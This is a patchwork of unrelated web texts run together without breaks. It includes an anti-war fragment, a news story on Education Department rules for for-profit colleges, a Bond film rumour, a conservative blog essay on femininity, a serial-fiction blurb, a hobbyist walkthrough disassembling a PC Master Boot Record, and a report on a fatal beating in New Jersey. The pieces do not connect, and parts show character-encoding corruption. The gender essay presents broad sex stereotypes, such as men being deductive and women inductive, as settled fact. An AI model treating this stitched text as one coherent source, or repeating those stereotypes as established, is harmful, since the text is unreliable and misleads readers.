We are not an army of feminist Hilary Clintons , risking our own lives for our beliefs .
Instead , we are young Americans without jobs in a failing American economy .
We are the youth of America whose only means to an education and an income is to kill and die on behalf of an enterprise that will not empower and assist Afghan women one day longer than American forces remain in the country .
Waging the western onslaught against the Taliban in their name will make Afghan women appear as collaborators with the foreigners most Afghans want expelled from their country as soon as possible .
To use Afghan women ’s plight that cynically is the worst betrayal .

Enlarge By H. Darr Beiser , USA TODAY Education Secretary Arne Duncan says for - profit colleges overall are doing a good job of preparing students , but a few " bad actors " are out there .
Visit insidehighered.com for more breaking news , features and commentary from the world of higher education .
The Education Department , concerned that some students are graduating from short - term training programs with excessive debt and worthless degrees , is cracking down on the for - profit college industry .
Under a proposal to be released today , vocational programs in which a large share of students do n't earn enough to pay back their loans would be required to disclose debt burdens and could become ineligible for federal financial aid dollars .
The proposal covers training programs of less than two years that provide credentials for careers in fields such as the culinary arts , medical support and automotive technology .
It applies to public and non-profit institutions , but the impact is expected to fall primarily on the fast - growing for - profit college industry in which , federal data show , students are more likely to borrow and to default .
Last month , education officials proposed other measures aimed at protecting college students and taxpayers from for - profit schools that engage in abusive or fraudulent practices , including aggressive recruitment tactics .
In remarks Thursday to reporters , Education Secretary Arne Duncan said 5 % of for - profit vocational programs would be ineligible for federal aid if today 's proposal were in effect now .
Education officials plan to accept public comment before publishing a final rule by Nov. 1 .
Colleges would have until July 2011 to adjust their policies and practices .
" Overall , I firmly believe for - profit schools are doing a good job in training students , " Duncan said Thursday .
But a few " bad actors " are " doing a disservice " to the entire industry .
Sen .
Tom Harkin , D - Iowa , who began hearings last month on the for - profit higher education industry , called the new proposal " plain common sense . "
But both critics and supporters of for - profit schools raised concerns about the details .
The Career College Association , which represents more than 1,800 for - profit schools , said in a statement that using the proposed formula to determine eligibility " is unwise , unnecessary , unproven and is likely to harm students , employers , institutions and taxpayers . "
And critics of for - profit schools said the plan is a step in the right direction but does n't go far enough .
The proposal has " some teeth in it ( but ) it is n't as strong as it should be to protect students and taxpayers from getting ripped off by career education , " said Pauline Abernathy , vice president of the non-profit Institute for College Access & Success .

After it was placed on indefinite hold by the struggling studio back in April , the next James Bond movie — Bond 23 , to be directed by Sam Mendes — is reportedly now officially dead .
While it ’s unclear if this means an end to Daniel Craig as James Bond , the most likely scenario is a few Bond - less years until the inevitable reboot starring Taylor Lautner .

I like reading the blog The Thinking Housewife .
Even when you disagree , the spicy insights into human nature and how far modern liberal society has gone off - track are worth the read .
There ’s a downside to it .
Like many conservative thinkers , the authoress feels backed into a corner because it seems like all but a few people in society are headed in the opposite direction .
This feeling is normal ; conservatives had to abandon the “ follow us , or you wo n’t succeed ” the instant the first rock star became a millionaire , so now they often fall into dogma and retaliation .
On a recent topic , I feel the authoress is off - base , and wanted to clarify my position here because I think we can all learn from the debate .
With luck , and if we ’re really lucky civility , others will join in and we can get a lively debate going — modernity outside of its technology will end up being a blip on the radar of history , and conservative ideas will prevail , but in the meantime it helps us to achieve clarity in the details of our beliefs .
This is a letter to The Thinking Housewife from a young woman :
ENNA writes : I have recently discovered both the â€œmanosphereâ€  and the small number of anti-feminist blogs .
While I disagree with some of the writings at both types of blogs , most of what is written has forced me to confront and deepen my conception of human nature , and I am glad of it .
I have come to realize more ( although I was already aware to some extent ) the differences between men and women , and the general strengths and weaknesses that each sex possesses .
However , I encounter some confusion when I try to apply these principles to myself .
In your recent post , â€ œMen are Slow to Ripen , â€  you wrote : I used to be baffled by why men seem so much slower at housework .
I now think this is a major reason .
They are trying to figure out a system , like a boy building a castle with Legos .
They are architects , not housekeepers .
Most women , even those who are extremely neat , donâ€™t create abstract plans as they work .
If they were domestic strategists , the world would fall apart within a matter of hours .
Similar disaster would ensue from the failure of men to conceptualize .
You see , I am ( and always have been ) a very conceptual thinker .
Ever since I was a teenager , I have tested an INTP ( nicknamed The Architect ) in the Meyers - Briggs Type Indicator ; I am a â€œsystems thinker , â€ very spatially oriented , and am always trying to discover the underlying plan behind any activity or way of thinking .
I also have trouble with houseworkâ € “ Iâ€™m too caught up in the â€œabstract plan.â€ 
I have been trying to cultivate a feminine attitude in myself , especially as I learn the toxicity of feminism , but am somewhat unable to reconcile this with my supposedly masculine way of thinking .
I try not to think of it as â€œwrongâ€  because my brain is God -given , and I could not stop myself from analyzing and abstracting any more than I could stop myself from breathing .
Sometimes I am unsure of how to act or think because my experience as a woman does not match up to many of the generalizations I read here and on other blogs .
I guess my questions for you are these :
If someone does not fit under the ideal woman , does that make her less feminine , or somehow inadequate for womanly tasks ?
( I have a hard time thinking so , as God made me a woman and not a man , but itâ€™s hard for me to reconcile that fact with how women are supposed to act and think . )
How far can these generalizations go ?
And what can or should be done when people donâ€™t fit completely under them ?
– TTHW , “ The Thinking Womanâ€™s Dilemma ”
I think femininity and masculinity are misunderstood here .
When we say they are complementary roles , we are talking about the mental organization and strengths of each supporting the other .
Men approach the world from a contractual , ends - over - means , casual and architectural state of mind .
Women approach the world from an adaptive , stabilizing , context - derived and atmospheric state of mind .
The former requires less elaboration than the latter , because the latter translates less well to language .
However , a good starting point is the difference between inductive and deductive reasoning .
Men are deductive : if all of the premises are true , the conclusion must be true .
( All crows are black ; this bird is a crow ; therefore , it is black . )
Women are inductive : if all of the premises are true , the conclusion is not necessarily true .
( All the crows I ’ve seen are black ; therefore , crows are black . )
These are valuable complementary intelligences .
Deductive reasoning empowers choices , while inductive reasoning empowers adaptation when insufficient data exists .
Both contain the other , by the way .
The idea that deductive reasoning always works requires an inductive leap of faith ; the idea that inductive reasoning is valuable requires us to deductively assess the likelihood of us having perfect data .
Even more , deductive reasoning is excellent for finding membership and categories and so manipulating those membes , but inductive reasoning works best when exploring either ( a ) a situation where the conclusion or goal is known but the methods remain a mystery or ( b ) a situation where nothing is known .
Further , both forms include emotional intelligence .
Man emotions tend to fall into the lines of finding that which is out of its category , and setting things right ; female emotions tend to involve finding what is important or beautiful in a situation , and pulling that out .
These are anecdotal observations but until our brains are fully debugged by science to the point where we can create an emulator for any given individual , and have it make the same decisions they would given identical stimulus , we ’re not going to have any data either way except the anecdotal .
In my view , Enna ’s thought process is not unfeminine .
She seems highly intelligent , and at the higher end of the intelligence curve , people tend to be “ androgynous ” in regards to these divisions of approach .
They are aware enough of what they are doing with their minds to program themselves , and so to adopt new behaviors ; this is a degree of complexity removed from what most people can do .
In addition , as an identified INTP , she is acting as her personality type mandates .
Her logical approach is not unfeminine because complementary gender roles do not dictate how an individual thinks , or what an ideal is , but describe a generalization based on that gender and its emotional / personality approach to processing stimulus .
The actual thought process can vary greatly within that categorical division .
To my mind , femininity is an acceptance of and expression of the feminine principle , which is induction and the ability to tolerate ambiguity that would break masculine thinking machines .
On the flip side , masculinity is the acceptance of and expression of the masculine principle , which is deduction and forward - looking planning .
Each exists optimally with the other , much like the cycle of winter / summer renews on either end what was depleted in the other .
Intelligent women exist and require an outlet for their thinking , and this is entirely independent of their acceptance of traditional roles .
In ancient times , women were expected to have minds , think , and even fight when called upon — these behaviors , or means , did not change their approach to life and mentation , or ends .
These observations are entirely coherent with the philosophy of parallelism that I espouse , which includes several tenets :
Multiple factors must be considered at once in any situation , because no cause exists without context , and for an answer to be not just valid logically but correct in reality it must reveal a complementary accord between these multiple factors .
Thoughts , matter and energy are substrates in which patterns exist in parallel , including natural selection , which compute data not previously existing .
If divine beings exist , they do so in a space that is parallel to our physical reality much as our thoughts parallel changes in matter , and much as we translate from mental to physical parallels through action , transcendental actions translate from physical to divine levels of organization .
What concerns us most is the first point : men and women are complementary factors in the situation of life , and where they coincide in decision is likely the right course in any complex decision .
In the creation of a home , the two work together and by balancing each other , are able to tackle any decision .
On inductive decisions , the woman leads ; on deductive ones , the man leads .
Then the other contributes balance and the decision is smoothed out through a process like natural selection , where together they test their ideas against their environment and arrive at a refined idea .
Laura
Wood hits on this in some important ways :
Men and women have general tendencies , with men given more toward the abstract and impersonal .
But there are so many exceptions and differences within the sexes , with some women possessing a more masculine type of intelligence , that it would be wrong to say that women are â€œsupposed toâ€ think in a certain way .
And no matter how masculine in thinking a woman may be , no woman is physically or spiritually a man .
…
Some women do have a special calling to do something other than marry and raise children , but even they possess the strong inborn drive to meet these feminine obligations , and the ones who are happy are those who are involved in work that allows them to achieve this feminine form of love in some way .
…
The women who are categorically unsuited to traditional feminine tasks are not those who are lousy housekeepers or who donâ€™t enjoy festooning their homes with stencilled flowers or who think like architects or who have been influenced by feminist thinking all their lives , but the women who are selfish or unable to connect with other people because of some serious weakness or handicap .
The first paragraph makes sense where it talks about spiritual femininity and masculinity .
You must identify with and accept your gender , and learn to love it , in order to grow into it ; further , you must be able to make sense of the inductive / deductive principle as it pertains to you .
From the second paragraph quoted above , I get the somewhat genderless truth of life : if you are not able to find meaning in a biological role , you will starve your soul .
Symbolically , rejection of the biological role of parenthood is rejection of your own parents and the culture that produced you .
It is hatred .
Parenthood does not need to be your only goal , but without it in your list of goals , you are missing out .
Her last paragraph rings true despite gender roles : selfishness is a subset of solipsism , or being unaware of the world outside of one ’s self .
Those who cannot connect to the world become abusive and crass .
However , I think she ’s off - base with this :
Women who are more masculine by nature may have an especially difficult time being feminine .
They may have to consciously cultivate the habits of thought and being that make it possible for them to live well as women .
…
Perhaps if you could devise a cure for lung cancer , a cure that no one else could invent , it would be more important than loving and serving others as a woman , but this is not likely .
There is nothing of more value or significance than fulfilling this common spiritual role .
…
Women who are more masculine by nature may have an especially difficult time being feminine .
They have to consciously cultivate in themselves the habits of thought and being that make it possible for them to be happy as women .
The most important of these ends is to love and serve .
I suggest that instead of thinking linearly , or in OR states ( if any condition is true , the assessment is true ) , we think in parallelist terms , or in AND states ( all conditions must be true ) : women can be many things at once , but denying any one of these things is fatal .
What unites the many parallel strands of woman - ness is femininity , or appreciation of and expression of the feminine principle .
When you read an older book and think about the women in it , you see an inner network to society run entirely by women .
They knew music , sciences , literature and art ; they communicated extensively by letters , and often were the supporters of ideas that others forgot because they could not justify them with the data at hand .
They educated their children and instilled in them creative desires and an urge to seek the mysteries of life .
These were educated , intelligent people who ran not only their households , but often their communities , in the parts of those tasks to which the feminine principle applies .
We cannot force women into femininity by making yes / no lists of activities .
We need to celebrate instead what makes femininity unique , and by accepting it as complementary to masculinity and equally as vital , empower women in the only real meaning of that word which is to give them space to grow and discover themselves .
Otherwise , we make the mistake that feminists make , but in reverse , by creating an adversarial relationship where none need exist .

What is a Penny Dreadful ?
Adventure , mystery , horror , romance … CLIFFHANGERS !
Penny Dreadfuls had it all , and could be bought for a single cent .
These action - packed stories were broken down into episodes , printed on cheap paper , and sold in mass quantities in the 1800’s .
The format emigrated to the United States , and was reborn in the Dime Novels , often filled with stories of the Wild West .
Eventually they were absorbed into magazines , radio dramas and movie shorts , before finally dying out .
That is , until now …
The Penny Dreadful is the next step in the evolution of serial fiction .
The internet provides a perfect media for creating short , ongoing stories that are inexpensive to produce and easy to distribute .
Our authors will be pushing the boundaries of what can be done in an episodic format , and stretching their own creative talent to keep their readers coming back for more .

NOW ON THE PENNY DREADFUL – WEBCOMICS BY TANGENT ARTISTS !
One day , I was curious about how the computer system goes from booting to actually loading up an operating system .
Obviously , it must retrieve the operating system from disk at some point , so I decided to investigate this .
The first step in this process is reading the MBR , or Master Boot Record of the hard drive .
The MBR is used to store data about where the OS is stored on the drive .
I figured the MBR would be interesting to learn a little bit more about , so I decided to load it up into IDA Pro , a tool for disassembling programs , and see what I could find out .
I learned a lot and had a lot of fun , so I ’m presenting it here to share my results .
For this analysis , I assume that you are familiar with the x86 architecture and assembly .
If not , WikiBooks has some great information about it here .
I am also using IDA Pro to do this .
I have tried to provide comments and labeling in my IDA work , but I also explain each block of code separately .
The first step in figuring out the MBR was to actually get a copy of it I could work with .
To do this , I used Hex Workshop , which offers a way to do a binary copy of hard disks .
The MBR is always located as the first sector of the disk , so I used Hex Workshop and extracted this file .
It is only 1 sector long , so it is a mere 512 bytes .
After looking at Wikipedia , I figured out the MBR structure was :
0000h - 01B7h Code Area ( 440 bytes ) 01B8 h - 01 BBh Disk Signature ( 4 bytes ) 01BCh - 01 BDh Generally Zeroed out ( 2 bytes ) 01BEh - 01 FDh List of Partition Records ( 4 16 - byte structures ) 01 FEh - 01 FFh MBR Signature ( 2 bytes - Must be AA55 h )
The above structure is what gets loaded into memory and executed .
The code area is going to do a few different things , which I look at below .
The disk signature can be used to uniquely identify a hard disk .
The partition records define different operating systems and partitions on the hard disk .
Have you ever noticed how you have to jump through some hoops if you want to have more than 4 operating systems or partitions on your computer ?
Well , that ’s because you only have 4 partition records available .
The MBR signature helps illustrate that this is in fact an MBR structure .
The partition records are a pretty important part of the MBR , so I also examined their structure .
It is :
0000h - 0000h Status byte ( 80h for bootable , 00h for non-bootable , others are invalid ) ( 1 byte ) 0001h - 0003h CHS address of first absolute sector ( 3 bytes ) 0004h - 0004h Partition type ( 1 byte ) 0005 h - 0007h CHS address of last absolute sector ( 3 bytes ) 0008h - 000Bh LBA of first absolute sector ( 4 bytes ) 000Ch - 000 Fh
Number of sectors in partition ( 4 bytes )
That is a pretty simple structure ; just a start and stop address , length , and a few informational bytes .
The CHS format is a little confusing though .
CHS stands for Cylinder - Head - Sector and defines an address inside of a physical hard drive .
You can read more about CHS here .
The LBA address stands for Logical Block Address .
LBA is a format to linearly address space on the hard drive , rather than defining 3 separate numbers for Cylinder - Head - Sector format .
More information about LBA is here .
After examining the file MBR structure , I loaded the binary file into IDA Pro .
Since it is a binary file , IDA does n’t know where the correct segments or entry points are , or even if it is 16 or 32 bit code .
Since we do n’t have an OS yet , we know that this code is 16 bit .
Looking at the MBR structure , the code starts at the very first byte of the file .
Knowing this , I configured IDA and converted the first few bytes to code .
I got the following :
s0:0000 ; ---------------------------------------------------------------------------
s0:0000 s0:0000 ; Segment type : Pure code s0:0000 seg000 segment byte public ' CODE ' use16 s0:0000 assume cs:seg000 s0:0000 assume es:nothing , ss : nothing , ds : nothing , fs : nothing , gs : nothing s0:0000 xor ax , ax ; Zero out AX s0:0002 mov ss , ax ; Set SS to 0 s0:0004 mov sp , 7C00h ; Set SP to 7C00h s0:0007 mov es , ax ; Set ES to 0 s0:0009 mov ds , ax ; Set DS to 0 s0:000B mov si , 7C00h ; Source for the copy s0:000E mov di , 600h ; This is the destination for the copy s0:0011 mov cx , 200h ; We want to copy 200h bytes , which is the length s0:0011 ; of one sector , i.e. the whole MBR .
s0:0014 cld ; Clear Direction Flag s0:0015 rep movsb ; Copies CX bytes from [ SI ] to [ DI ] s0:0015 ; i.e. from [ 7C00h ] to [ 600h ] s0:0017 push ax ; New value for CS s0:0018 s0:0018 loc_18 : ; New value for IP s0:0018 push 61Ch s0:001B retf ;
Pops the top of the stack into IP then pops CS s0:001B ; off next .
s0:001B ; i.e. we will run from 0000h:61Ch , s0:001B ; which is where we just copied ourselves to .
s0:001B ; s0:001B ; Execution continues at the next instruction .
I have tried to add a lot of comments to show what is going on .
Essentially though , what this is doing is copying the MBR from 0000h:7C00h to 0000:600h .
This is necessary , because it will later load the OS to 0000h:7C00h , so it needs to get itself out of the way .
It does this using the ‘ rep movsb ’ which does a binary copy of 200 bytes from SI ( 7C00h ) to DI ( 600h ) .
An interesting part about the code above is the way that the ‘ retf ’ instruction is used .
This does what is known as a ‘ far jump ’ .
This means it not only jumps to a different instruction address , but also a different code segment .
Both of these values are popped off of the stack , with the offset being on top and the new segment being second .
Before the retf instruction , the program pushes 0 and then ’ 61 Ch ’ onto the stack to setup for this far jump .
This may seem strange , but since it just copied all the program data to 0000h:0600h , 61Ch is actually the offset to the instruction directly after the retf in the binary .
The next few instructions are :
s0:001C sti ; Enable interrupts s0:001D mov cx , 4 ; This will be used for the loop .
s0:001D ; We only want to examine 4 partition records .
s0:0020 mov bp , 7BEh ;
This is the offset to the first partition s0:0020 ; record .
s0:0020 ; In the MBR structure , the first partition s0:0020 ; record is at base + 1BEh , s0:0023 so it is 600h + 1BEh = 7BEh s0:0023
First thing this code does is to enable interrupts so that it can be interrupted if necessary .
Next , it sets the CX register to 4 and BP to 7BEh .
BP is the offset to the partition records ( there is a description of these records here ) .
CX is indicating that we will only examine 4 records ( since there are only 4 in the MBR ) .
So this is setting up to iterate over the 4 partition records to find the bootable one that we want .
After this is a loop that tries to find a bootable partition entry .
The code is :
s0:0023 loc_23 : ; CODE XREF : seg000:0030 j s0:0023 cmp byte ptr [ bp+0 ] , 0 ; Compares the status byte to 0 s0:0027 jl short FoundBootableEntry ; Jumps if the status flag is not 0 . s0:0027 ; This will happen if the MSB of [ bp+0 ] s0:0027 ; is 1 , essentially saying that if it s0:0027 ; is 0x80 , it will jump .
s0:0027 ; s0:0027 ;
This jump indicates that we have found the s0:0027 ; bootable partition .
s0:0029 jnz PrintInvalidPartitionTable ;
It 's not 0x80 and it's not 0x0 , so s0:0029 ; it 's invalid .
Jump to an error state .
s0:002D add bp , 10h ; Go to the next partition record .
s0:0030 loop loc_23 ; Loop while CX != 0 s0:0032 int 18h ; TRANSFER TO ROM BASIC s0:0032 ; causes transfer to ROM - based BASIC ( IBM - PC ) s0:0032 ; often reboots a compatible ; often has no effect s0:0034 ; at all
Remember how above we moved the offset of 7BEh into BP ?
That is so this loop can then examine the partition records .
The comparison is checking the status byte of the partition record and comparing it to 0 .
If it is 0 , the first jump will not be taken , nor will the second jump , so 10h is added to BP and the loop is restarted .
Advancing the BP register means that we will examine a different partition record .
If , after 4 iterations , we have still not found a bootable partition entry , an ‘ int 18 h ’ call will be made .
On old IBM PCs , this would run a BASIC interpreter from ROM , but few computers have this .
So essentially , an int 18h call will just stop the system .
Imagine that , if you have no bootable entries , you ’re computer wo n’t boot !
If the status byte of the parition record was in fact 80h , the first jump would have been taken .
The JL instruction does a jump if the status flag is set to 1 .
This flag will get set by the previous CMP instruction if the high order bit is set in the status byte , i.e. the status byte is 80h .
If the entries status byte is neither 80h or 00h , a jump is made to the PrintInvalidPartitionTable location .
I ’ll talk about that a little bit , but it ’s pretty boring ( it just prints an error message ) ; when a bootable entry is found , things are much more fun .
The next block of code is run when a bootable entry is found .
Here it is :
s0:0034 FoundBootableEntry : ; CODE XREF : seg000:0027 j s0:0034 ; seg000:00 AEj s0:0034 mov [ bp+0 ] , dl ;
Save the drive number for later s0:0034 ; Note that since this will most likely be the s0:0034 ; first hard drive , DL will probably be 0x80 s0:0037 push bp s0:0038 mov byte ptr [ bp+11h ] , 5 s0:003C mov byte ptr [ bp+10h ] , 0 ; This is a sentinel value for later s0:0040 s0:0040 loc_40 : ; DATA XREF : seg000:014
Fr s0:0040 mov ah , 41h ; ' A ' s0:0042 mov bx , 55AAh s0:0045 int 13 h ; DISK - Installation Check s0:0045 ; CF set on error s0:0045 ; CF cleared on success s0:0045 ; BX = AA55 if installed s0:0045 ; AH = major version of extensions s0:0045 ; CX = API subset s0:0045 ; DH = Extension version s0:0047 pop bp s0:0048 jb short AttemptLoadFromDisk ; Jump if Below ( CF=1 ) s0:004A cmp bx , 0AA55 h ; DATA XREF : seg000:0045r s0:004A ; seg000:007 Er ... s0:004A ; Compare Two Operands s0:004E jnz short AttemptLoadFromDisk ; Jump if Not Zero ( ZF=0 ) s0:0050 test cx , 1 ; Logical Compare s0:0054 jz short AttemptLoadFromDisk ; Jump if Zero ( ZF=1 ) s0:0056 inc byte ptr [ bp+10 h ] ;
This acts like a sentinel value s0:0056 ; for whether or not the INT 13 s0:0056 ; extended read is installed s0:0059
First part of this block does is moves the DL register into where the entry ’s status byte used to be .
I was n’t really too sure what was going on here for a long time , since if it overwrites the partition record , wo n’t it not boot correctly next time ?
Well , it turns out that the first hard drive is represented by 80h , so most of the time , things will be fine .
I do n’t have 2 hard drives , so I ’m not sure what would happen if you had two hard drives and had your bootable entry on the second hard drive .
I suspect that the 2nd hard drive would just have its own MBR and would run that instead .
Running code on 1 hard drive and loading data from another hard drive seems a little bit silly anyways , so I ’m pretty sure that ’s whats going on .
If you know more , please leave a comment !
Next , the code saves the partition record to the stack and moves the values 5 and 0 into the status byte .
The 5 indicates the number of attempts that will be made to read from disk later .
Multiple attempts will be made because the disk read might fail while the disk spins up .
The 0 value is a sentinel value for whether or not the BIOS supports the extended interrupt 13h feature .
This is an advanced , easier way to load lots of data from disk into memory , but not all BIOSs support it .
The code above runs several different checks and if they all succeed , it stores a 1 where it had just stored a 0 , indicating the extended read feature is supported .
If any of those checks fails , it just jumps down a few lines and continues executing and will use the older method .
The next section of code loads the first sector of the OS into memory , using a different method depending on whether or not the extended read is supported .
Here it is :
s0:0059 AttemptLoadFromDisk : ; CODE XREF : seg000:0048 j s0:0059 ; seg000:004 Ej ... s0:0059 pushad ;
Save all our registers for a little bit s0:005B cmp byte ptr [ bp+10h ] , 0 ; Did our sentinel value get changed ?

Right away , a comparison is done against the sentinel value .
If it is 0 ( indicating no extended read ) , a jump is taken to the Installation Failed label .
If the extended read is supported , an “ address packet ” is set up for the interrupt and then the int 13h call is made , performing the read .
This was actually a pretty tricky section to figure out , mostly because I found all the documentation about address packets was pretty confusing .
After the extended read is completed , the code jumps to the PostDiskReadState location .
I expect there are a few errors in my comments about the address packet , which I might try to figure out more about later .
Both the extended read and the non-extended read code do essentially the same thing though .
They load the first sector of the bootable partition into memory at 0000h:7C00h .
This will most likely be the operating system ’s loader which will get things started up properly .
Before we jump to the OS though , first we have a little bit of maintenance to do , to make sure we are set up and good to go .
After the disk reads are done , we need to make sure that everything succeeded , which is what this block of code does :
s0:009B PostDiskReadState : ; CODE XREF : seg000:0085 j s0:009B popad ; Restore all our registers s0:009D jnb short DiskReadSuccess ; Jump if CF = 0 s0:009D ; i.e .
The interrupt we just executed ( either one ) s0:009D ; just succeeded .
s0:009 F dec byte ptr [ bp+11 h ] ;
Remember this was set to 5 before ?
s0:009F ; This is looping and trying the disk several times , s0:009F ; ( it might have failed while the disk spun up ) s0:00A2 jnz short ReattemptDiskRead ; Jump if Not Zero ( ZF=0 ) s0:00 A4 cmp byte ptr [ bp+0 ] , 80h ; ' Ç ' ;
Is this drive letter 80h , i.e. the s0:00A4 ; first hard drive ?
s0:00A8 jz PrintErrorLoadingOperatingSystem ; Jump if Zero ( ZF=1 ) s0:00 AC mov dl , 80 h ; ' Ç ' ; Re-try on the first hard drive s0:00 AE jmp short FoundBootableEntry ; Jump s0:00B0 ; --------------------------------------------------------------------------- s0:00B0 s0:00B0 ReattemptDiskRead : ; CODE XREF : seg000:00A2 j s0:00B0 push bp s0:00B1 xor ah , ah ; Logical Exclusive OR s0:00B3 mov dl , [ bp+0 ] s0:00B6 int 13 h ; DISK - RESET DISK SYSTEM s0:00B6 ; DL = drive ( if bit 7 is set both hard disks and s0:00B6 ; floppy disks reset ) s0:00B6 ; s0:00B6 ; This is important so we can try the read again s0:00B8 pop bp s0:00 B9 jmp short AttemptLoadFromDisk ; Jump
For both style of disk reads , if the operation succeeded , the carry flag will be cleared .
As such , there is a JNB instruction that is taken if the load succeeded and jumps to the DiskReadSuccess location .
If not , the counter we previously set to 5 is decremented .
Remember how I talked about that the disk read might fail sometimes ?
This code is taking into account the drive being busy , not being spun up , or any other reason by just re-trying a few times .
If however , it has failed after the 5 attempts , something is wrong .
A comparison is then made to see if we are on the first hard drive by comparing the drive letter we wrote to [ BP+0 ] with 80h .
If it is , there is a problem loading the OS , so we print an error message .
If not , we change the DL register to 80h , indicating the first hard drive , and try the whole process again .
The ReattemptDiskRead code is pretty straightforward .
All it does is resets the disk system and jumps back to the AttemptLoadFromDisk location .
Pretty simple , huh ?
Hopefully the disk read will succeed though , and the code will get to the DiskReadSuccess location .
We are very close to actually jumping to the OS in that case .
Here is the code :
s0:00 BB DiskReadSuccess : ; CODE XREF : seg000:009
Dj s0:00 BB cmp word ptr ds : 7DFEh , 0AA55 h ; We just loaded new code to 7C00h .
Check s0:00 BB ; to see if it has the bootable signature AA55 .
s0:00 BB ; This signature indicates a VBR , which indicates s0:00 BB ; an operating system s0:00C1 jnz short PrintMissingOperatingSystem ;
The last two bytes are NOT AA55h s0:00C1 ; so there is no OS .
s0:00C1 ; Print an error message .

This code first checks to see that we did , in fact load an OS and not just some garbage into memory by checking for the AA55h signature .
If it is not there , we print an error message .
Otherwise , we ’re going to fiddle with the keyboard controller a bit .
This code makes several calls to the CheckKeyboardSystemFlag function , which basically loops until the keyboard controller is ready to talk to to the CPU .
I ’m a little fuzzy on what the output to the ports is doing , but I ’m pretty sure that it is enabling the A20 address line , which enables larger amounts of memory to be used .
It ’s a pretty common task and there are write - ups all over the Internet , so I wo n’t go into it .
After the MBR is done fiddling with the keyboard controller , it decides to check for a Trusted Platform Module .
The TPM is used to do several security related things , such as for Windows BitLocker encryption .
There is a lot of complex documentation , so after I figured out that this was TPM code , I decided not to investigate it further .
It is listed below :
s0:00E2 CheckForTPM : ; CODE XREF : seg000:00C9 j s0:00E2 mov ax , 0BB00h s0:00E5 int 1Ah s0:00E7 and eax , eax ; Logical AND s0:00 EA jnz short JumpToLoadedMemory ; Jump if Not Zero ( ZF=0 ) s0:00 EC cmp ebx , 41504354h ; Compare Two Operands s0:00F3 jnz short JumpToLoadedMemory ; Jump if Not Zero ( ZF=0 ) s0:00F5 cmp cx , 102h ; Compare Two Operands s0:00F9 jb short JumpToLoadedMemory ; Jump if Below ( CF=1 ) s0:00 FB push large 0BB07h s0:0101 push large 200h s0:0107 push large 8 s0:010D push ebx s0:010 F push ebx s0:0111 push ebp s0:0113 push large 0 s0:0119 push large 7C00h s0:011 F popad ; Pop all General Registers ( use32 ) s0:0121 push 0 s0:0124 pop es s0:0125 int 1Ah ; This makes a call to the TPM
The code first checks for the presence of a TPM module .
If it is not there , it jumps to the JumpToLoaded Memory location , otherwise it makes a call to the TPM .
Well , ladies and gentlement , thanks for sticking with me .
After all that , we are finally ready to jump to the operating system that we loaded into memory .
It ’s very simple , so without further adieu :
s0:0127 JumpToLoadedMemory : ; CODE XREF : seg000:00 EAj s0:0127 ; seg000:00F3 j ... s0:0127 pop dx s0:0128 xor dh , dh ; Logical Exclusive OR s0:012A jmp far ptr 0:7C00h ; Jump to the code we have loaded
That ’s it ?!
Yup , that ’s it .
Anti-climactic , though I guess Master Boot Records are n’t supposed to be entertaining .
There is some more code that I did n’t talk about yet , because it has to do with printing the error messages out .
I ’m not going to explain it here , since I ’m already over 3000 words and I ’m sure you ’re sick of reading .
Here it is :
s0:0131 PrintMissingOperatingSystem : ; CODE XREF : seg000:00C1 j s0:0131 mov al , ds : 7B7h s0:0134 jmp short DisplayErrorMessage ; Jump s0:0136 ; --------------------------------------------------------------------------- s0:0136 s0:0136 PrintErrorLoadingOperatingSystem : ; CODE XREF : seg000:00A8 j s0:0136 mov al , ds : 7B6h s0:0139 jmp short DisplayErrorMessage ; Jump s0:013B ; --------------------------------------------------------------------------- s0:013B s0:013B PrintInvalidPartitionTable : ; CODE XREF : seg000:0029 j s0:013B mov al , ds : 7B5h s0:013E s0:013E DisplayErrorMessage : ; CODE XREF : seg000:0134 j s0:013E ; seg000:0139 j s0:013E xor ah , ah ; Clear out the high byte of the AX register .

I realize that a blog post is a pretty difficult way to explain an RE task like this well .
As such , I ’m going to make my IDA Pro database available for download here .
If you do n’t have IDA , there is a free version ( which I use ) available here .
It is missing quite a few features , but the price is right , and for work like this ( 16 - bit MBR code ) , a lot of the newer features are n’t even relevant .
If you ’re interested , you could do this analysis on your own computer .
Depending on your computer ’s manufacturer , you might have some small differences , but those are what makes it fun , right ?
To get started , get the trial of Hex Workshop , extract the MBR ( it ’s the first sector on the disk ) , then use the free version of IDA Pro to examine it .
Happy hunting !

New Jersey Teens Charged in Videotaped Beating Death of Immigrant Video rolled as Abelino Mazaniego was beaten on a Summit , N.J. , park bench .
July 23 , 2010  --
Police in a wealthy New Jersey suburb are looking for anyone who may have seen a group of teenagers brutally beat a local dishwasher while videotaping the attack .
Abelino Mazaniego , 47 , was sitting on a Summit , N.J. , park bench last Saturday after finishing his shift at a nearby restaurant when two teens ran up , threw a sheet over him and began pummeling the El Salvadorian immigrant with their fists .
The father and husband never regained consciousness after suffering severe head trauma , and he died on Tuesday .
" The brutality , as the facts come out or whatever we 've seen , it 's beyond senseless , " said Colin Crasto , the manager and chef of Dabbawalla Restaurant , where Mazaniego worked for more than three years .
" I have no idea why kids that young would pick on somebody , " Crasto said .
" He just appeared to be a defenseless person sitting on a bench .
I have no idea why they would have done it . "
The Union County Prosecutor 's Office has charged a 17 - year - old whose name was not released because of his age and Khayri Williams - Clark , 18 , with manslaughter .
A prosecutor 's spokesman said the attack remained under investigation .
A third teen who allegedly made the videotape that investigators said was distributed to a number of Summit teenagers has not been charged .
Though Mazaniego's beating was the latest in several attacks on Hispanic people in the New York area , prosecutors said there was nothing yet to indicate it was racially motivated .
The case against Williams - Clark , who lives in Summit , was referred today to a grand jury after he waived his right to appear in court .
The juvenile also was scheduled to appear in court today .
Tom Rosenthal , a spokesman for the New Jersey Office of the Public Defender , confirmed that Williams - Clark was being held in $ 100,000 bond , but declined to comment on anything about the teen or a possible defense strategy .
" It 's too early in the process , " he said .
The office also is representing the 17 - year - old .
A funeral will be held for Mazaniego in Summit on Monday , according to local reports .
Crasto said his body will then be flown home to El Salvador .
Beating Victim Was Married , a Father
Crasto said Mazaniego had proven himself to be a hard worker and was well - liked even though he only spoke Spanish , often leaving him with little way to communicate with his co-workers .
Crasto said he understood from other employees who speak snippets of Spanish that Mazaniego was married and had four children .
He had his working papers and worked washing dishes and doing kitchen prep .
The night he was beaten , Mazaniego was let off work about two hours early .
The restaurant was closed most of the day while the Crasto and most of the workers were at an off - site catering function .
Mazaniego and a few others , he said , worked through lunch preparing for the next day and then left the restaurant around 8 p.m .
Crasto does n't know much about what Mazaniego might have done that night , but believes he got a slice of pizza before sitting down on the bench not far from Dabbawallas .
